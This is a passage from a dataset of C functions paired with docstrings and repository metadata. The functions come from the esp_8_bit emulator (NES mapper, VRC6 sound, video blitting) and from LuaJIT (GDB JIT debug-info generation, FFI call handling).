'd';\n\t\t\tcontinue;\n\t\t}\n\t\tif (*p == '%')\n\t\t\t*f++ = '%'; /* double the percents */\n\t\t*f++ = *p;\n\t\tif (*p == '\\0')\n\t\t\treturn; /* ok */\n\t\tp++;\n\t}\n\tLog_print(\"Invalid filename pattern for screenshots, using default.\");\n\tstrcpy(screenshot_filename_format, DEFAULT_SCREENSHOT_FILENAME_FORMAT);\n\tscreenshot_no_max = 1000;\n}", "path": "esp_8_bit/src/atari800/screen.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/******************************************/\n/* Mapper #46 write handler ($6000-$FFFF) */\n/******************************************/\n", "func_signal": "static void map46_write (uint32 address, uint8 value)", "code": "{\n  /* $8000-$FFFF: D6-D4 = lower three bits of CHR bank */\n  /*              D0    = low bit of PRG bank          */\n  /* $6000-$7FFF: D7-D4 = high four bits of CHR bank   */\n  /*              D3-D0 = high four bits of PRG bank   */\n  if (address & 0x8000)\n  {\n    prg_low_bank = value & 0x01;\n    chr_low_bank = (value >> 4) & 0x07;\n    map46_set_banks ();\n  }\n  else\n  {\n    prg_high_bank = value & 0x0F;\n    chr_high_bank = (value >> 4) & 0x0F;\n    map46_set_banks ();\n  }\n\n  /* Done */\n  return;\n}", "path": "esp_8_bit/src/nofrendo/map046.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* blits a bitmap onto primary buffer */\n", "func_signal": "void vid_blit(bitmap_t *bitmap, int src_x, int src_y, int dest_x, int dest_y, \n              int width, int height)", "code": "{\n   int bitmap_pitch, primary_pitch;\n   uint8 *dest_ptr, *src_ptr;\n\n   ASSERT(bitmap);\n\n   /* clip to source */\n   if (src_y >= bitmap->height)\n      return;\n   if (src_y + height > bitmap->height)\n      height = bitmap->height - src_y;\n\n   if (src_x >= bitmap->width)\n      return;\n   if (src_x + width > bitmap->width)\n      width = bitmap->width - src_x;\n\n   /* clip to dest */\n   if (dest_y + height <= 0)\n   {\n      return;\n   }\n   else if (dest_y < 0)\n   {\n      height += dest_y;\n      src_y -= dest_y;\n      dest_y = 0;\n   }\n\n   if (dest_y >= primary_buffer->height)\n      return;\n   if (dest_y + height > primary_buffer->height)\n      height = primary_buffer->height - dest_y;\n\n   if (dest_x + width <= 0)\n   {\n      return;\n   }\n   else if (dest_x < 0)\n   {\n      width += dest_x;\n      src_x -= dest_x;\n      dest_x = 0;\n   }\n\n   if (dest_x >= primary_buffer->width)\n      return;\n   if (dest_x + width > primary_buffer->width)\n      width = primary_buffer->width - dest_x;   \n\n   src_ptr = bitmap->line[src_y] + src_x;\n   dest_ptr = primary_buffer->line[dest_y] + dest_x;\n\n   /* Avoid doing unnecessary indexed lookups */\n   bitmap_pitch = bitmap->pitch;\n   primary_pitch = primary_buffer->pitch;\n\n   /* do the copy */\n   while (height--)\n   {\n      vid_memcpy(dest_ptr, src_ptr, width);\n      src_ptr += bitmap_pitch;\n      dest_ptr += primary_pitch;\n   }\n}", "path": "esp_8_bit/src/nofrendo/vid_drv.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* write to registers */\n", "func_signal": "static void vrcvi_write(uint32 address, uint8 value)", "code": "{\n   int chan = (address >> 12) - 9;\n\n   switch (address & 0xB003)\n   {\n   case 0x9000:\n   case 0xA000:\n      vrcvi.rectangle[chan].reg[0] = value;\n      vrcvi.rectangle[chan].volume = (value & 0x0F) << 8;\n      vrcvi.rectangle[chan].duty_flip = (value >> 4) + 1;\n      break;\n\n   case 0x9001:\n   case 0xA001:\n      vrcvi.rectangle[chan].reg[1] = value;\n      vrcvi.rectangle[chan].freq = ((vrcvi.rectangle[chan].reg[2] & 0x0F) << 8) + value + 1;\n      break;\n\n   case 0x9002:\n   case 0xA002:\n      vrcvi.rectangle[chan].reg[2] = value;\n      vrcvi.rectangle[chan].freq = ((value & 0x0F) << 8) + vrcvi.rectangle[chan].reg[1] + 1;\n      vrcvi.rectangle[chan].enabled = (value & 0x80) ? true : false;\n      break;\n\n   case 0xB000:\n      vrcvi.saw.reg[0] = value;\n      vrcvi.saw.volume = value & 0x3F;\n      break;\n\n   case 0xB001:\n      vrcvi.saw.reg[1] = value;\n      vrcvi.saw.freq = (((vrcvi.saw.reg[2] & 0x0F) << 8) + value + 1) << 1;\n      break;\n\n   case 0xB002:\n      vrcvi.saw.reg[2] = value;\n      vrcvi.saw.freq = (((value & 0x0F) << 8) + vrcvi.saw.reg[1] + 1) << 1;\n      vrcvi.saw.enabled = (value & 0x80) ? true : false;\n      break;\n\n   default:\n      break;\n   }\n}", "path": "esp_8_bit/src/nofrendo/vrcvisnd.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/*********************************************************/\n/* Mapper #46: Pelican Game Station (aka Rumble Station) */\n/*********************************************************/\n", "func_signal": "static void map46_init (void)", "code": "{\n  /* High bank switch register is set to zero on reset */\n  prg_high_bank = 0x00;\n  chr_high_bank = 0x00;\n  map46_set_banks ();\n\n  /* Done */\n  return;\n}", "path": "esp_8_bit/src/nofrendo/map046.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* mix vrcvi sound channels together */\n", "func_signal": "static int32 vrcvi_process(void)", "code": "{\n   int32 output;\n\n   output = vrcvi_rectangle(&vrcvi.rectangle[0]);\n   output += vrcvi_rectangle(&vrcvi.rectangle[1]);\n   output += vrcvi_sawtooth(&vrcvi.saw);\n\n   return output;\n}", "path": "esp_8_bit/src/nofrendo/vrcvisnd.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* VRCVI rectangle wave generation */\n", "func_signal": "static int32 vrcvi_rectangle(vrcvirectangle_t *chan)", "code": "{\n   /* reg0: 0-3=volume, 4-6=duty cycle\n   ** reg1: 8 bits of freq\n   ** reg2: 0-3=high freq, 7=enable\n   */\n\n   chan->accum -= vrcvi.incsize; /* # of clocks per wave cycle */\n   while (chan->accum < 0)\n   {\n      chan->accum += chan->freq;\n      chan->adder = (chan->adder + 1) & 0x0F;\n   }\n\n   /* return if not enabled */\n   if (false == chan->enabled)\n      return 0;\n\n   if (chan->adder < chan->duty_flip)\n      return -(chan->volume);\n   else\n      return chan->volume;\n}", "path": "esp_8_bit/src/nofrendo/vrcvisnd.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* reset state of vrcvi sound channels */\n", "func_signal": "static void vrcvi_reset(void)", "code": "{\n   int i;\n   apu_t apu;\n\n   /* get the phase period from the apu */\n   apu_getcontext(&apu);\n   vrcvi.incsize = apu.cycle_rate;\n\n   /* preload regs */\n   for (i = 0; i < 3; i++)\n   {\n      vrcvi_write(0x9000 + i, 0);\n      vrcvi_write(0xA000 + i, 0);\n      vrcvi_write(0xB000 + i, 0);\n   }\n}", "path": "esp_8_bit/src/nofrendo/vrcvisnd.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* !(defined(__GNUC__) && defined(i386)) */\n", "func_signal": "INLINE void vid_memcpy(void *dest, const void *src, int len)", "code": "{\n   uint32 *s = (uint32 *) src;\n   uint32 *d = (uint32 *) dest;\n\n   ASSERT(0 == ((len & 3) | ((uint32) src & 3) | ((uint32) dest & 3)));\n   len >>= 2;\n\n   DUFFS_DEVICE(*d++ = *s++, len);\n}", "path": "esp_8_bit/src/nofrendo/vid_drv.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/*****************************************************/\n/* Pull extra mapper information out of a SNSS block */\n/*****************************************************/\n", "func_signal": "static void map46_getstate (SnssMapperBlock *state)", "code": "{\n  /* TODO: Retrieve SNSS information */\n  UNUSED (state);\n\n  /* Done */\n  return;\n}", "path": "esp_8_bit/src/nofrendo/map046.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* DCM decompression ----------------------------------------------------- */\n", "func_signal": "static int fgetw(FILE *fp)", "code": "{\n\tint low;\n\tint high;\n\tlow = fgetc(fp);\n\tif (low == EOF)\n\t\treturn -1;\n\thigh = fgetc(fp);\n\tif (high == EOF)\n\t\treturn -1;\n\treturn low + (high << 8);\n}", "path": "esp_8_bit/src/atari800/compfile.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/****************************************************/\n/* Shove extra mapper information into a SNSS block */\n/****************************************************/\n", "func_signal": "static void map46_setstate (SnssMapperBlock *state)", "code": "{\n  /* TODO: Store SNSS information */\n  UNUSED (state);\n\n  /* Done */\n  return;\n}", "path": "esp_8_bit/src/nofrendo/map046.c", "commit_date": "2020-05-11 00:00:00", "repo_name": "rossumur/esp_8_bit", "stars": 1011, "license": "None", "language": "c", "size": 8202}
{"docstring": "/* Add a SLEB128 value. */\n", "func_signal": "static void gdbjit_sleb128(GDBJITctx *ctx, int32_t v)", "code": "{\n  uint8_t *p = ctx->p;\n  for (; (uint32_t)(v+0x40) >= 0x80; v >>= 7)\n    *p++ = (uint8_t)((v & 0x7f) | 0x80);\n  *p++ = (uint8_t)(v & 0x7f);\n  ctx->p = p;\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Initialize .debug_abbrev section. */\n", "func_signal": "static void LJ_FASTCALL gdbjit_debugabbrev(GDBJITctx *ctx)", "code": "{\n  uint8_t *p = ctx->p;\n\n  /* Abbrev #1: DW_TAG_compile_unit. */\n  DUV(1); DUV(DW_TAG_compile_unit);\n  DB(DW_children_no);\n  DUV(DW_AT_name);\tDUV(DW_FORM_string);\n  DUV(DW_AT_low_pc);\tDUV(DW_FORM_addr);\n  DUV(DW_AT_high_pc);\tDUV(DW_FORM_addr);\n  DUV(DW_AT_stmt_list);\tDUV(DW_FORM_data4);\n  DB(0); DB(0);\n\n  ctx->p = p;\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Classify a struct based on its fields. */\n", "func_signal": "static unsigned int ccall_classify_struct(CTState *cts, CType *ct, CType *ctf)", "code": "{\n  CTSize sz = ct->size;\n  unsigned int r = 0, n = 0, isu = (ct->info & CTF_UNION);\n  if ((ctf->info & CTF_VARARG)) goto noth;\n  while (ct->sib) {\n    CType *sct;\n    ct = ctype_get(cts, ct->sib);\n    if (ctype_isfield(ct->info)) {\n      sct = ctype_rawchild(cts, ct);\n      if (ctype_isfp(sct->info)) {\n\tr |= sct->size;\n\tif (!isu) n++; else if (n == 0) n = 1;\n      } else if (ctype_iscomplex(sct->info)) {\n\tr |= (sct->size >> 1);\n\tif (!isu) n += 2; else if (n < 2) n = 2;\n      } else if (ctype_isstruct(sct->info)) {\n\tgoto substruct;\n      } else {\n\tgoto noth;\n      }\n    } else if (ctype_isbitfield(ct->info)) {\n      goto noth;\n    } else if (ctype_isxattrib(ct->info, CTA_SUBTYPE)) {\n      sct = ctype_rawchild(cts, ct);\n    substruct:\n      if (sct->size > 0) {\n\tunsigned int s = ccall_classify_struct(cts, sct, ctf);\n\tif (s <= 1) goto noth;\n\tr |= (s & 255);\n\tif (!isu) n += (s >> 8); else if (n < (s >>8)) n = (s >> 8);\n      }\n    }\n  }\n  if ((r == 4 || r == 8) && n <= 4)\n    return r + (n << 8);\nnoth:  /* Not a homogeneous float/double aggregate. */\n  return (sz <= 4);  /* Return structs of size <= 4 in a GPR. */\n}", "path": "luajit/src/lj_ccall.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Initialize .eh_frame section. */\n", "func_signal": "static void LJ_FASTCALL gdbjit_ehframe(GDBJITctx *ctx)", "code": "{\n  uint8_t *p = ctx->p;\n  uint8_t *framep = p;\n\n  /* Emit DWARF EH CIE. */\n  DSECT(CIE,\n    DU32(0);\t\t\t/* Offset to CIE itself. */\n    DB(DW_CIE_VERSION);\n    DSTR(\"zR\");\t\t\t/* Augmentation. */\n    DUV(1);\t\t\t/* Code alignment factor. */\n    DSV(-(int32_t)sizeof(uintptr_t));  /* Data alignment factor. */\n    DB(DW_REG_RA);\t\t/* Return address register. */\n    DB(1); DB(DW_EH_PE_textrel|DW_EH_PE_udata4);  /* Augmentation data. */\n    DB(DW_CFA_def_cfa); DUV(DW_REG_SP); DUV(sizeof(uintptr_t));\n#if LJ_TARGET_PPC\n    DB(DW_CFA_offset_extended_sf); DB(DW_REG_RA); DSV(-1);\n#else\n    DB(DW_CFA_offset|DW_REG_RA); DUV(1);\n#endif\n    DALIGNNOP(sizeof(uintptr_t));\n  )\n\n  /* Emit DWARF EH FDE. */\n  DSECT(FDE,\n    DU32((uint32_t)(p-framep));\t/* Offset to CIE. */\n    DU32(0);\t\t\t/* Machine code offset relative to .text. */\n    DU32(ctx->szmcode);\t\t/* Machine code length. */\n    DB(0);\t\t\t/* Augmentation data. */\n    /* Registers saved in CFRAME. */\n#if LJ_TARGET_X86\n    DB(DW_CFA_offset|DW_REG_BP); DUV(2);\n    DB(DW_CFA_offset|DW_REG_DI); DUV(3);\n    DB(DW_CFA_offset|DW_REG_SI); DUV(4);\n    DB(DW_CFA_offset|DW_REG_BX); DUV(5);\n#elif LJ_TARGET_X64\n    DB(DW_CFA_offset|DW_REG_BP); DUV(2);\n    DB(DW_CFA_offset|DW_REG_BX); DUV(3);\n    DB(DW_CFA_offset|DW_REG_15); DUV(4);\n    DB(DW_CFA_offset|DW_REG_14); DUV(5);\n    /* Extra registers saved for JIT-compiled code. */\n    DB(DW_CFA_offset|DW_REG_13); DUV(9);\n    DB(DW_CFA_offset|DW_REG_12); DUV(10);\n#elif LJ_TARGET_ARM\n    {\n      int i;\n      for (i = 11; i >= 4; i--) { DB(DW_CFA_offset|i); DUV(2+(11-i)); }\n    }\n#elif LJ_TARGET_PPC\n    {\n      int i;\n      DB(DW_CFA_offset_extended); DB(DW_REG_CR); DUV(55);\n      for (i = 14; i <= 31; i++) {\n\tDB(DW_CFA_offset|i); DUV(37+(31-i));\n\tDB(DW_CFA_offset|32|i); DUV(2+2*(31-i));\n      }\n    }\n#elif LJ_TARGET_MIPS\n    {\n      int i;\n      DB(DW_CFA_offset|30); DUV(2);\n      for (i = 23; i >= 16; i--) { DB(DW_CFA_offset|i); DUV(26-i); }\n      for (i = 30; i >= 20; i -= 2) { DB(DW_CFA_offset|32|i); DUV(42-i); }\n    }\n#else\n#error \"Unsupported target architecture\"\n#endif\n    if (ctx->spadjp != ctx->spadj) {  /* Parent/interpreter stack frame size. */\n      DB(DW_CFA_def_cfa_offset); DUV(ctx->spadjp);\n      DB(DW_CFA_advance_loc|1);  /* Only an approximation. */\n    }\n    DB(DW_CFA_def_cfa_offset); DUV(ctx->spadj);  /* Trace stack frame size. */\n    DALIGNNOP(sizeof(uintptr_t));\n  )\n\n  ctx->p = p;\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Recursively classify a struct based on its fields. */\n", "func_signal": "static int ccall_classify_struct(CTState *cts, CType *ct, int *rcl, CTSize ofs)", "code": "{\n  if (ct->size > 16) return CCALL_RCL_MEM;  /* Too big, gets memory class. */\n  while (ct->sib) {\n    CTSize fofs;\n    ct = ctype_get(cts, ct->sib);\n    fofs = ofs+ct->size;\n    if (ctype_isfield(ct->info))\n      ccall_classify_ct(cts, ctype_rawchild(cts, ct), rcl, fofs);\n    else if (ctype_isbitfield(ct->info))\n      rcl[(fofs >= 8)] |= CCALL_RCL_INT;  /* NYI: unaligned bitfields? */\n    else if (ctype_isxattrib(ct->info, CTA_SUBTYPE))\n      ccall_classify_struct(cts, ctype_rawchild(cts, ct), rcl, fofs);\n  }\n  return ((rcl[0]|rcl[1]) & CCALL_RCL_MEM);  /* Memory class? */\n}", "path": "luajit/src/lj_ccall.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Combine returned small struct. */\n", "func_signal": "static void ccall_struct_ret(CCallState *cc, int *rcl, uint8_t *dp, CTSize sz)", "code": "{\n  GPRArg sp[2];\n  MSize ngpr = 0, nfpr = 0;\n  uint32_t i;\n  for (i = 0; i < 2; i++) {\n    if ((rcl[i] & CCALL_RCL_INT)) {  /* Integer class takes precedence. */\n      sp[i] = cc->gpr[ngpr++];\n    } else if ((rcl[i] & CCALL_RCL_SSE)) {\n      sp[i] = cc->fpr[nfpr++].l[0];\n    }\n  }\n  memcpy(dp, sp, sz);\n}", "path": "luajit/src/lj_ccall.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Build in-memory ELF object. */\n", "func_signal": "static void gdbjit_buildobj(GDBJITctx *ctx)", "code": "{\n  GDBJITobj *obj = &ctx->obj;\n  /* Fill in ELF header and clear structures. */\n  memcpy(&obj->hdr, &elfhdr_template, sizeof(ELFheader));\n  memset(&obj->sect, 0, sizeof(ELFsectheader)*GDBJIT_SECT__MAX);\n  memset(&obj->sym, 0, sizeof(ELFsymbol)*GDBJIT_SYM__MAX);\n  /* Initialize sections. */\n  ctx->p = obj->space;\n  gdbjit_initsect(ctx, GDBJIT_SECT_shstrtab, gdbjit_secthdr);\n  gdbjit_initsect(ctx, GDBJIT_SECT_strtab, gdbjit_symtab);\n  gdbjit_initsect(ctx, GDBJIT_SECT_debug_info, gdbjit_debuginfo);\n  gdbjit_initsect(ctx, GDBJIT_SECT_debug_abbrev, gdbjit_debugabbrev);\n  gdbjit_initsect(ctx, GDBJIT_SECT_debug_line, gdbjit_debugline);\n  SECTALIGN(ctx->p, sizeof(uintptr_t));\n  gdbjit_initsect(ctx, GDBJIT_SECT_eh_frame, gdbjit_ehframe);\n  ctx->objsize = (size_t)((char *)ctx->p - (char *)obj);\n  lua_assert(ctx->objsize < sizeof(GDBJITobj));\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Get results from C call. */\n", "func_signal": "static int ccall_get_results(lua_State *L, CTState *cts, CType *ct,\n\t\t\t     CCallState *cc, int *ret)", "code": "{\n  CType *ctr = ctype_rawchild(cts, ct);\n  uint8_t *sp = (uint8_t *)&cc->gpr[0];\n  if (ctype_isvoid(ctr->info)) {\n    *ret = 0;  /* Zero results. */\n    return 0;  /* No additional GC step. */\n  }\n  *ret = 1;  /* One result. */\n  if (ctype_isstruct(ctr->info)) {\n    /* Return cdata object which is already on top of stack. */\n    if (!cc->retref) {\n      void *dp = cdataptr(cdataV(L->top-1));  /* Use preallocated object. */\n      CCALL_HANDLE_STRUCTRET2\n    }\n    return 1;  /* One GC step. */\n  }\n  if (ctype_iscomplex(ctr->info)) {\n    /* Return cdata object which is already on top of stack. */\n    void *dp = cdataptr(cdataV(L->top-1));  /* Use preallocated object. */\n    CCALL_HANDLE_COMPLEXRET2\n    return 1;  /* One GC step. */\n  }\n  if (LJ_BE && ctype_isinteger_or_bool(ctr->info) && ctr->size < CTSIZE_PTR)\n    sp += (CTSIZE_PTR - ctr->size);\n#if CCALL_NUM_FPR\n  if (ctype_isfp(ctr->info) || ctype_isvector(ctr->info))\n    sp = (uint8_t *)&cc->fpr[0];\n#endif\n#ifdef CCALL_HANDLE_RET\n  CCALL_HANDLE_RET\n#endif\n  /* No reference types end up here, so there's no need for the CTypeID. */\n  lua_assert(!(ctype_isrefarray(ctr->info) || ctype_isstruct(ctr->info)));\n  return lj_cconv_tv_ct(cts, ctr, 0, L->top-1, sp);\n}", "path": "luajit/src/lj_ccall.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Append a decimal number. */\n", "func_signal": "static void gdbjit_catnum(GDBJITctx *ctx, uint32_t n)", "code": "{\n  if (n >= 10) { uint32_t m = n / 10; n = n % 10; gdbjit_catnum(ctx, m); }\n  *ctx->p++ = '0' + n;\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Initialize .debug_line section. */\n", "func_signal": "static void LJ_FASTCALL gdbjit_debugline(GDBJITctx *ctx)", "code": "{\n  uint8_t *p = ctx->p;\n\n  DSECT(line,\n    DU16(2);\t\t\t/* DWARF version. */\n    DSECT(header,\n      DB(1);\t\t\t/* Minimum instruction length. */\n      DB(1);\t\t\t/* is_stmt. */\n      DI8(0);\t\t\t/* Line base for special opcodes. */\n      DB(2);\t\t\t/* Line range for special opcodes. */\n      DB(3+1);\t\t\t/* Opcode base at DW_LNS_advance_line+1. */\n      DB(0); DB(1); DB(1);\t/* Standard opcode lengths. */\n      /* Directory table. */\n      DB(0);\n      /* File name table. */\n      DSTR(ctx->filename); DUV(0); DUV(0); DUV(0);\n      DB(0);\n    )\n\n    DLNE(DW_LNE_set_address, sizeof(uintptr_t)); DADDR(ctx->mcaddr);\n    if (ctx->lineno) {\n      DB(DW_LNS_advance_line); DSV(ctx->lineno-1);\n    }\n    DB(DW_LNS_copy);\n    DB(DW_LNS_advance_pc); DUV(ctx->szmcode);\n    DLNE(DW_LNE_end_sequence, 0);\n  )\n\n  ctx->p = p;\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Add new entry to GDB JIT symbol chain. */\n", "func_signal": "static void gdbjit_newentry(lua_State *L, GDBJITctx *ctx)", "code": "{\n  /* Allocate memory for GDB JIT entry and ELF object. */\n  MSize sz = (MSize)(sizeof(GDBJITentryobj) - sizeof(GDBJITobj) + ctx->objsize);\n  GDBJITentryobj *eo = lj_mem_newt(L, sz, GDBJITentryobj);\n  memcpy(&eo->obj, &ctx->obj, ctx->objsize);  /* Copy ELF object. */\n  eo->sz = sz;\n  ctx->T->gdbjit_entry = (void *)eo;\n  /* Link new entry to chain and register it. */\n  eo->entry.prev_entry = NULL;\n  eo->entry.next_entry = __jit_debug_descriptor.first_entry;\n  if (eo->entry.next_entry)\n    eo->entry.next_entry->prev_entry = &eo->entry;\n  eo->entry.symfile_addr = (const char *)&eo->obj;\n  eo->entry.symfile_size = ctx->objsize;\n  __jit_debug_descriptor.first_entry = &eo->entry;\n  __jit_debug_descriptor.relevant_entry = &eo->entry;\n  __jit_debug_descriptor.action_flag = GDBJIT_REGISTER;\n  __jit_debug_register_code();\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Add a zero-terminated string. */\n", "func_signal": "static uint32_t gdbjit_strz(GDBJITctx *ctx, const char *str)", "code": "{\n  uint8_t *p = ctx->p;\n  uint32_t ofs = (uint32_t)(p - ctx->startp);\n  do {\n    *p++ = (uint8_t)*str;\n  } while (*str++);\n  ctx->p = p;\n  return ofs;\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Pass a small struct argument. */\n", "func_signal": "static int ccall_struct_arg(CCallState *cc, CTState *cts, CType *d, int *rcl,\n\t\t\t    TValue *o, int narg)", "code": "{\n  GPRArg dp[2];\n  dp[0] = dp[1] = 0;\n  /* Convert to temp. struct. */\n  lj_cconv_ct_tv(cts, d, (uint8_t *)dp, o, CCF_ARG(narg));\n  if (ccall_struct_reg(cc, dp, rcl)) {  /* Register overflow? Pass on stack. */\n    MSize nsp = cc->nsp, n = rcl[1] ? 2 : 1;\n    if (nsp + n > CCALL_MAXSTACK) return 1;  /* Too many arguments. */\n    cc->nsp = nsp + n;\n    memcpy(&cc->stack[nsp], dp, n*CTSIZE_PTR);\n  }\n  return 0;  /* Ok. */\n}", "path": "luajit/src/lj_ccall.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Add a ULEB128 value. */\n", "func_signal": "static void gdbjit_uleb128(GDBJITctx *ctx, uint32_t v)", "code": "{\n  uint8_t *p = ctx->p;\n  for (; v >= 0x80; v >>= 7)\n    *p++ = (uint8_t)((v & 0x7f) | 0x80);\n  *p++ = (uint8_t)v;\n  ctx->p = p;\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Call C function. */\n", "func_signal": "int lj_ccall_func(lua_State *L, GCcdata *cd)", "code": "{\n  CTState *cts = ctype_cts(L);\n  CType *ct = ctype_raw(cts, cd->ctypeid);\n  CTSize sz = CTSIZE_PTR;\n  if (ctype_isptr(ct->info)) {\n    sz = ct->size;\n    ct = ctype_rawchild(cts, ct);\n  }\n  if (ctype_isfunc(ct->info)) {\n    CCallState cc;\n    int gcsteps, ret;\n    cc.func = (void (*)(void))cdata_getptr(cdataptr(cd), sz);\n    gcsteps = ccall_set_args(L, cts, ct, &cc);\n    ct = (CType *)((intptr_t)ct-(intptr_t)cts->tab);\n    cts->cb.slot = ~0u;\n    lj_vm_ffi_call(&cc);\n    if (cts->cb.slot != ~0u) {  /* Blacklist function that called a callback. */\n      TValue tv;\n      setlightudV(&tv, (void *)cc.func);\n      setboolV(lj_tab_set(L, cts->miscmap, &tv), 1);\n    }\n    ct = (CType *)((intptr_t)ct+(intptr_t)cts->tab);  /* May be reallocated. */\n    gcsteps += ccall_get_results(L, cts, ct, &cc, &ret);\n#if LJ_TARGET_X86 && LJ_ABI_WIN\n    /* Automatically detect __stdcall and fix up C function declaration. */\n    if (cc.spadj && ctype_cconv(ct->info) == CTCC_CDECL) {\n      CTF_INSERT(ct->info, CCONV, CTCC_STDCALL);\n      lj_trace_abort(G(L));\n    }\n#endif\n    while (gcsteps-- > 0)\n      lj_gc_check(L);\n    return ret;\n  }\n  return -1;  /* Not a function. */\n}", "path": "luajit/src/lj_ccall.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Delete debug info for trace and notify GDB. */\n", "func_signal": "void lj_gdbjit_deltrace(jit_State *J, GCtrace *T)", "code": "{\n  GDBJITentryobj *eo = (GDBJITentryobj *)T->gdbjit_entry;\n  if (eo) {\n    if (eo->entry.prev_entry)\n      eo->entry.prev_entry->next_entry = eo->entry.next_entry;\n    else\n      __jit_debug_descriptor.first_entry = eo->entry.next_entry;\n    if (eo->entry.next_entry)\n      eo->entry.next_entry->prev_entry = eo->entry.prev_entry;\n    __jit_debug_descriptor.relevant_entry = &eo->entry;\n    __jit_debug_descriptor.action_flag = GDBJIT_UNREGISTER;\n    __jit_debug_register_code();\n    lj_mem_free(J2G(J), eo, eo->sz);\n  }\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
{"docstring": "/* Initialize symbol table. */\n", "func_signal": "static void LJ_FASTCALL gdbjit_symtab(GDBJITctx *ctx)", "code": "{\n  ELFsymbol *sym;\n\n  *ctx->p++ = '\\0';  /* Empty string at start of string table. */\n\n  sym = &ctx->obj.sym[GDBJIT_SYM_FILE];\n  sym->name = gdbjit_strz(ctx, \"JIT mcode\");\n  sym->sectidx = ELFSECT_IDX_ABS;\n  sym->info = ELFSYM_TYPE_FILE|ELFSYM_BIND_LOCAL;\n\n  sym = &ctx->obj.sym[GDBJIT_SYM_FUNC];\n  sym->name = gdbjit_strz(ctx, \"TRACE_\"); ctx->p--;\n  gdbjit_catnum(ctx, ctx->T->traceno); *ctx->p++ = '\\0';\n  sym->sectidx = GDBJIT_SECT_text;\n  sym->value = 0;\n  sym->size = ctx->szmcode;\n  sym->info = ELFSYM_TYPE_FUNC|ELFSYM_BIND_GLOBAL;\n}", "path": "luajit/src/lj_gdbjit.c", "commit_date": "2014-01-16 00:00:00", "repo_name": "LuaDist/luajit", "stars": 565, "license": "other", "language": "c", "size": 10992}
